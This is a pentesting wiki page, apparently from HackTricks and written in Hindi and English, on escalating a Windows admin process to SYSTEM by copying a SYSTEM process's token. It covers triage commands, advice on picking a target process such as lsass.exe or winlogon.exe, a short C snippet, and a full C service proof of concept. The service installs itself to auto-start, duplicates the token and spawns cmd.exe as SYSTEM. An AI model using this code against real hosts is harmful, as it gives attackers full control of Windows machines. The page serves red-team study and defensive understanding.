# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

यह पेज **manual token-theft** वैरिएंट को कवर करता है, जहाँ **High Integrity** context, जिसके पास पहले से **`SeDebugPrivilege`** और **`SeImpersonatePrivilege`** हैं, एक उपयुक्त **SYSTEM** process खोलता है, **उसका token duplicate** करता है, और उस token के साथ **नया process spawn** करता है।

अगर आपको सिर्फ किसी privileged admin process से जल्दी `SYSTEM` shell चाहिए, तो यह भी देखें:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

अगर आपके पास **process-handle path** नहीं है लेकिन **`SeImpersonatePrivilege`** है, तो **named-pipe / Potato** route आमतौर पर आसान होता है:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

token-copy path आज़माने से पहले, पुष्टि करें कि current process पहले से ही एक उपयोगी context में है:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** आपको कई **non-protected** SYSTEM processes खोलने देता है, भले ही उनका DACL आम तौर पर आपको block कर दे।
- **`SeImpersonatePrivilege`** बाद में **`CreateProcessWithTokenW`** को practical बनाता है।
- अगर token-copy path से सिर्फ एक कमजोर या filtered SYSTEM token मिलता है, तो बस किसी **different SYSTEM process** से steal करें।

## लक्ष्य process को carefully चुनें

यह technique आम तौर पर **`lsass.exe`** के खिलाफ दिखाई जाती है, लेकिन modern Windows पर यह अक्सर **गलत target** होता है:

- अगर **LSA Protection / RunAsPPL** enabled है, तो **`lsass.exe`** protected होता है और `SeDebugPrivilege` वाला normal admin process भी उसे open नहीं कर पाएगा।
- **non-PPL SYSTEM processes** को prefer करें, जैसे **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, या कोई early **`svchost.exe`** instance।
- **Protected processes** और कुछ special processes, जैसे **`System`** या **`csrss.exe`**, इस technique के लिए realistic user-mode targets नहीं हैं।
- Elevated mode में चल रहे **Process Hacker / Process Explorer** का उपयोग करके verify करें कि target token में वाकई वे privileges हैं जो आप चाहते हैं, उससे पहले कि आप उसे duplicate करें।

## API details जो practice में matter करते हैं

बहुत सारे public PoCs **`PROCESS_ALL_ACCESS`** और **`TOKEN_ALL_ACCESS`** request करते हैं, लेकिन यह जितना जरूरी है उससे ज्यादा noisy है। Practice में:

- Target process को सिर्फ उन rights के साथ open करें जिनकी आपको जरूरत है (आम तौर पर **`PROCESS_QUERY_INFORMATION`** या **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Token को process creation के लिए जरूरी rights के साथ open करें: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- **`DuplicateTokenEx(..., TokenPrimary, ...)`** का उपयोग करके एक **primary token** बनाएं; सिर्फ impersonation token नया process बनाने के लिए काफी नहीं होता।
- अगर **`CreateProcessWithTokenW`** **`1314`** के साथ fail हो, तो **`CreateProcessAsUserW`** पर switch करें।
- अगर आप किसी **service / Session 0** से launch कर रहे हैं, तो याद रखें कि **`CreateProcessWithTokenW`** child को **caller की session** में ही रखता है। अगर आपको visible desktop shell चाहिए, तो **`CreateProcessAsUserW`** का उपयोग करें और token को desired session में move करें।

एक minimal modern flow इस तरह दिखता है:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

निम्नलिखित code **`SeDebugPrivilege` और `SeImpersonatePrivilege` privileges का exploit** करता है ताकि **SYSTEM** के रूप में चल रहे एक **process** से **token copy** किया जा सके, और जिसमें **सभी token privileges** हों। इस मामले में, code को compile करके **Windows service binary** के रूप में इस्तेमाल किया जा सकता है ताकि verify किया जा सके कि यह primitive काम करता है।

**elevation जहाँ होता है** उसका main part **`Exploit`** function के अंदर है। उस function में आप देख सकते हैं कि **`lsass.exe`** को search किया जाता है, उसका **token copy** किया जाता है, और अंत में वही token इस्तेमाल करके copied token के सभी privileges के साथ एक नया **`cmd.exe`** spawn किया जाता है।

Modern hosts पर, आप अक्सर **`lsass.exe`** को किसी अन्य **non-PPL SYSTEM process** जैसे **`winlogon.exe`**, **`wininit.exe`**, या **`services.exe`** से replace करना चाहेंगे।

SYSTEM के रूप में चल रहे और सभी या अधिकांश token privileges वाले अन्य processes हैं: **`services.exe`**, **`svchost.exe`** (कुछ शुरुआती ones), **`wininit.exe`**, **`csrss.exe`**... याद रखें कि आम तौर पर आप **protected process** से token copy नहीं कर पाएंगे।
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## संदर्भ

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
